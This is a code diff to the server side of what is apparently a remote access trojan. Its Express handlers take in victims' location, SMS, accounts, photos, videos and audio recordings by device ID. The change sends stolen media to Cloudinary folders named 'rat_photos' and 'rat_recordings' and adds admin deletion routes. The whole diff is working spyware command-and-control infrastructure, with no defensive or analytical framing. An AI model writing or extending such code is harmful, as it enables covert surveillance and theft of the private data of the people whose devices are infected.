@@ -6,6 +6,12 @@ const Photo = require('../models/Photo');
 const Recording = require('../models/Recording');
 const Device = require('../models/Device');
 const Command = require('../models/Command');
+const {
+  uploadToCloudinary,
+  deleteFromCloudinary,
+  deleteCloudinaryFolder,
+  extractPublicId,
+} = require('../utils/cloudinary');
 
 // @desc    Receive location data from device
 // @route   POST /api/data/location
@@ -34,7 +40,6 @@ const receiveSms = async (req, res) => {
       return res.json({ success: true, count: 0 });
     }
 
-    // Bulk insert with upsert to avoid duplicates
     const operations = messages.map((msg) => ({
       updateOne: {
         filter: { deviceId, date: msg.date, address: msg.address, body: msg.body },
@@ -167,7 +172,7 @@ const receiveAccounts = async (req, res) => {
   }
 };
 
-// @desc    Upload photo/video file
+// @desc    Upload photo/video file to Cloudinary
 // @route   POST /api/data/upload-media
 const uploadMedia = async (req, res) => {
   try {
@@ -177,10 +182,21 @@ const uploadMedia = async (req, res) => {
 
     const { deviceId, fileName, mimeType, isVideo, latitude, longitude } = req.body;
 
+    // Determine Cloudinary folder: rat_photos/{deviceId}/
+    const folder = `rat_photos/${deviceId}`;
+    const resourceType = (isVideo === 'true' || isVideo === true) ? 'video' : 'image';
+
+    // Upload to Cloudinary
+    const result = await uploadToCloudinary(req.file.buffer, folder, fileName || req.file.originalname, {
+      resource_type: resourceType,
+    });
+
     const photo = await Photo.create({
       deviceId,
       fileName: fileName || req.file.originalname,
-      filePath: `/uploads/${deviceId}/${req.file.filename}`,
+      filePath: result.secure_url,
+      publicId: result.public_id,
+      resourceType,
       fileSize: req.file.size,
       mimeType: mimeType || req.file.mimetype,
       isVideo: isVideo === 'true' || isVideo === true,
@@ -191,11 +207,12 @@ const uploadMedia = async (req, res) => {
 
     res.json({ success: true, photoId: photo._id });
   } catch (error) {
-    res.status(500).json({ success: false, message: 'Server error' });
+    console.error('Upload media error:', error.message);
+    res.status(500).json({ success: false, message: 'Server error: ' + error.message });
   }
 };
 
-// @desc    Receive audio recording
+// @desc    Receive audio recording and upload to Cloudinary
 // @route   POST /api/data/upload-recording
 const uploadRecording = async (req, res) => {
   try {
@@ -205,10 +222,20 @@ const uploadRecording = async (req, res) => {
 
     const { deviceId, fileName, duration, mimeType } = req.body;
 
+    // Determine Cloudinary folder: rat_recordings/{deviceId}/
+    const folder = `rat_recordings/${deviceId}`;
+
+    // Upload to Cloudinary (audio as raw or video resource type)
+    const result = await uploadToCloudinary(req.file.buffer, folder, fileName || req.file.originalname, {
+      resource_type: 'video', // Cloudinary treats audio files as video type
+    });
+
     const recording = await Recording.create({
       deviceId,
       fileName: fileName || req.file.originalname,
-      filePath: `/uploads/${deviceId}/${req.file.filename}`,
+      filePath: result.secure_url,
+      publicId: result.public_id,
+      resourceType: 'video',
       fileSize: req.file.size,
       duration: duration || 0,
       mimeType: mimeType || req.file.mimetype,
@@ -217,7 +244,8 @@ const uploadRecording = async (req, res) => {
 
     res.json({ success: true, recordingId: recording._id });
   } catch (error) {
-    res.status(500).json({ success: false, message: 'Server error' });
+    console.error('Upload recording error:', error.message);
+    res.status(500).json({ success: false, message: 'Server error: ' + error.message });
   }
 };
 
@@ -308,6 +336,72 @@ const getDeviceData = async (req, res) => {
   }
 };
 
+// @desc    Delete a single photo from Cloudinary and database (admin)
+// @route   DELETE /api/data/photo/:photoId
+const deletePhoto = async (req, res) => {
+  try {
+    const { photoId } = req.params;
+    const photo = await Photo.findById(photoId);
+
+    if (!photo) {
+      return res.status(404).json({ success: false, message: 'Photo not found' });
+    }
+
+    // Delete from Cloudinary
+    if (photo.publicId) {
+      const result = await deleteFromCloudinary(photo.publicId, photo.resourceType || 'image');
+      console.log('Cloudinary delete result:', result);
+    } else if (photo.filePath) {
+      // Fallback: try to extract public_id from URL
+      const publicId = extractPublicId(photo.filePath, photo.resourceType || 'image');
+      if (publicId) {
+        await deleteFromCloudinary(publicId, photo.resourceType || 'image');
+      }
+    }
+
+    // Delete from database
+    await Photo.findByIdAndDelete(photoId);
+
+    res.json({ success: true, message: 'Photo deleted successfully' });
+  } catch (error) {
+    console.error('Delete photo error:', error.message);
+    res.status(500).json({ success: false, message: 'Server error' });
+  }
+};
+
+// @desc    Delete a single recording from Cloudinary and database (admin)
+// @route   DELETE /api/data/recording/:recordingId
+const deleteRecording = async (req, res) => {
+  try {
+    const { recordingId } = req.params;
+    const recording = await Recording.findById(recordingId);
+
+    if (!recording) {
+      return res.status(404).json({ success: false, message: 'Recording not found' });
+    }
+
+    // Delete from Cloudinary
+    if (recording.publicId) {
+      const result = await deleteFromCloudinary(recording.publicId, recording.resourceType || 'video');
+      console.log('Cloudinary delete result:', result);
+    } else if (recording.filePath) {
+      // Fallback: try to extract public_id from URL
+      const publicId = extractPublicId(recording.filePath, recording.resourceType || 'video');
+      if (publicId) {
+        await deleteFromCloudinary(publicId, recording.resourceType || 'video');
+      }
+    }
+
+    // Delete from database
+    await Recording.findByIdAndDelete(recordingId);
+
+    res.json({ success: true, message: 'Recording deleted successfully' });
+  } catch (error) {
+    console.error('Delete recording error:', error.message);
+    res.status(500).json({ success: false, message: 'Server error' });
+  }
+};
+
 module.exports = {
   receiveLocation,
   receiveSms,
@@ -319,5 +413,6 @@ module.exports = {
   uploadRecording,
   updateCommandStatus,
   getDeviceData,
+  deletePhoto,
+  deleteRecording,
 };
-
